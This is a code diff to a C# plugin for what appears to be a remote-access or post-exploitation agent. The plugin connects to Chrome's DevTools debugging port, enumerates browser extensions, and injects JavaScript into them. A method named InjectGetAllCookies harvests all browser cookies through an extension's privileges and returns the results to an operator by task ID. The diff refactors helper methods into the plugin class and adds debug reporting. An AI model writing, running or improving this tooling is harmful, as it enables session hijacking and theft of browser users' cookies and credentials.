@@ -1,16 +1,18 @@
 ﻿using Agent;
+using Agent.Interfaces;
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Reflection.Metadata.Ecma335;
 using System.Text;
 using System.Text.Json;
 using System.Threading.Tasks;
 
 namespace Agent
 {
-    internal class DebugHelper
+    public partial class Plugin : IInteractivePlugin, IFilePlugin
     {
-        internal static List<string> GetPermissionsFromManifest(ExtensionManifest manifest)
+        internal List<string> GetPermissionsFromManifest(ExtensionManifest manifest)
         {
             List<string> permissions = new List<string>();
             foreach (var permission in manifest.result.value.permissions)
@@ -20,7 +22,7 @@ namespace Agent
 
             return permissions;
         }
-        internal static async Task<string> InjectGetAllCookies(ChromeJsonObject extension)
+        internal async Task<string> InjectGetAllCookies(ChromeJsonObject extension, string task_id)
         {
             using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
             {
@@ -30,8 +32,12 @@ namespace Agent
                 {
                     await webSocket.ConnectAsync(new Uri(extension.webSocketDebuggerUrl), System.Threading.CancellationToken.None);
                 }
-                catch
+                catch (Exception e)
                 {
+                    if (this.config.debug)
+                    {
+                        await ReturnOutput(e.ToString(), task_id);
+                    }
                     return "";
                 }
 
@@ -51,25 +57,25 @@ namespace Agent
                 return await WebSocketHelper.ReceiveMessage(webSocket);
             }
         }
-        internal static async Task<string> InjectJs(string id, string jsCode, CursedConfig config)
+        internal async Task<string> InjectJs(string id, string jsCode, CursedConfig config, string task_id)
         {
-            var extensions = await GetExtensions(config);
+            var extensions = await GetExtensions(config, task_id);
 
             foreach (var extension in extensions)
             {
                 if (extension.id == id)
                 {
-                    return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl));
+                    return await InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id);
                 }
             }
             return "Failed to identify specified extension.";
         }
-        internal static bool TryInjectJs(ChromeJsonObject extension, string jsCode, out string response)
+        internal bool TryInjectJs(ChromeJsonObject extension, string jsCode, string task_id, out string response)
         {
-            response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl)).Result;
+            response = InjectJs(jsCode, new Uri(extension.webSocketDebuggerUrl), task_id).Result;
             return true;
         }
-        internal static async Task<string> InjectJs(string jsCode, Uri uri)
+        internal async Task<string> InjectJs(string jsCode, Uri uri, string task_id)
         {
             using (var webSocket = new System.Net.WebSockets.ClientWebSocket())
             {
@@ -79,6 +85,10 @@ namespace Agent
                 }
                 catch (Exception e)
                 {
+                    if (this.config.debug)
+                    {
+                        await ReturnOutput(e.ToString(), task_id);
+                    }
                     return "Failed to connect to websocket." + Environment.NewLine + e.ToString();
                 }
 
@@ -105,7 +115,7 @@ namespace Agent
                 return await WebSocketHelper.ReceiveMessage(webSocket);
             }
         }
-        internal static async Task<List<ChromeJsonObject>> GetExtensions(CursedConfig config)
+        internal async Task<List<ChromeJsonObject>> GetExtensions(CursedConfig config, string task_id)
         {
             List<ChromeJsonObject> extensions = new List<ChromeJsonObject>();
             using (HttpClient client = new HttpClient())
@@ -115,6 +125,10 @@ namespace Agent
                     // Fetch list of targets from DevTools Protocol
                     string targetsUrl = $"http://localhost:{config.debug_port}/json/list";
                     string targetsJson = await client.GetStringAsync(targetsUrl);
+                    if (this.config.debug)
+                    {
+                        await ReturnOutput(targetsJson, task_id);
+                    }
 
                     List<ChromeJsonObject> targets = JsonSerializer.Deserialize<List<ChromeJsonObject>>(targetsJson);
 
@@ -128,18 +142,29 @@ namespace Agent
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.ToString());
+                    if (this.config.debug)
+                    {
+                        await ReturnOutput(e.ToString(), task_id);
+                    }
                 }
             }
             return extensions;
         }
-        internal static bool TryGetManifestFromExtension(ChromeJsonObject extension, string task_id, out ExtensionManifest manifest)
+        internal bool TryGetManifestFromExtension(ChromeJsonObject extension, string task_id, out ExtensionManifest manifest)
         {
             manifest = new ExtensionManifest();
 
-            if (!TryInjectJs(extension, "chrome.runtime.getManifest()", out var response))
+            if (!TryInjectJs(extension, "chrome.runtime.getManifest()", task_id, out var response)) 
             {
-                return false;
+                if (this.config.debug)
+                {
+                    ReturnOutput("Error getting manifest for " + extension.id + " " + response, task_id);
+                }
+                return false; 
+            }
+            if (this.config.debug)
+            {
+                ReturnOutput(response, task_id);
             }
 
             JsonDocument responseJsonDocument;
@@ -150,6 +175,7 @@ namespace Agent
             }
             catch (Exception e)
             {
+                ReturnOutput("Failure getting manifest." + Environment.NewLine + e.ToString(), task_id);
                 return false;
             }
 
@@ -158,6 +184,7 @@ namespace Agent
 
             if (!responseRoot.TryGetProperty("result", out JsonElement resultElement))
             {
+                ReturnOutput("Failure parsing manifest from result.", task_id);
                 return false;
             }
 
@@ -166,8 +193,9 @@ namespace Agent
                 manifest = JsonSerializer.Deserialize<ExtensionManifest>(resultElement.GetRawText());
                 return true;
             }
-            catch
+            catch (Exception e)
             {
+                ReturnOutput("Failure deserializing manifest." + Environment.NewLine + e.ToString(), task_id);
                 return false;
             }
         }
